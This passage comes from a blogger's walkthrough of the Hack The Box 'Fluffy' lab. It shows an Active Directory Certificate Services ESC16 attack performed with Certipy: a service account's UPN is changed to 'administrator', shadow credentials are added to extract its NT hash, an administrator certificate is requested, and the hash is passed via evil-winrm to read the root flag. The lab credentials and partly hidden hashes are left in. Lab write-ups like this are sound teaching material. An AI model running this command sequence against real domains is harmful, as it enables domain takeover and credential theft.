    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-11-05T08:20:17+00:00
```

Step 2: Update the victim account’s UPN to the target administrator’s sAMAccountName.

```
 certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Step 3: From the vulnerable CA (affected by ESC16), request a certificate for the “victim” user using any suitable client authentication template (e.g., “User”).

```
┌──(achilles㉿Nicholas)-[~]
└─$ certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b6609d9dc6b941548fd884e0260846b3'
[*] Adding Key Credential with device ID 'b6609d9dc6b941548fd884e0260846b3' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'b6609d9dc6b941548fd884e0260846b3' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf5<hidden>
```

- <span id="4c22">Generates a certificate and key credential for .\
  • Authenticates as with the certificate.\
  • Obtains a TGT and NT hash for .\
  • Saves credential cache to .\
  Then request a certificate:</span>

```
┌──(achilles㉿Nicholas)-[~]
└─$ export KRB5CCNAME=ca_svc.ccache

┌──(achilles㉿Nicholas)-[~]
└─$ certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Step 4: Restore the victim account’s original UPN.

```
──(achilles㉿Nicholas)-[~]
└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'

```

Step 5: Authenticate as the target administrator.

```
┌──(achilles㉿Nicholas)-[~]
└─$ certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<hidden>
```

Now go Ahead and sign in evil-winrm and grab the root flag..

```
──(achilles㉿Nicholas)-[~/HTB/Labs/fluffy]
└─$ evil-winrm -i 10.10.11.69 -u 'administrator' -H '8da83a3fa618b6e3a00e9<snip>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/3/2025   9:26 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
678878ecfec2d4bd45ea58c<snip>
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Well that is the end of this one.. i really enjoyed this lab, In fact I enjoy all of them to be honest… hope this helps and have a great day!

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [November 5, 2025](https://medium.com/p/6963fc9abde2).

<a href="https://medium.com/@nicholasmullenski/fluffy-htb-machine-walk-through-6963fc9abde2" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
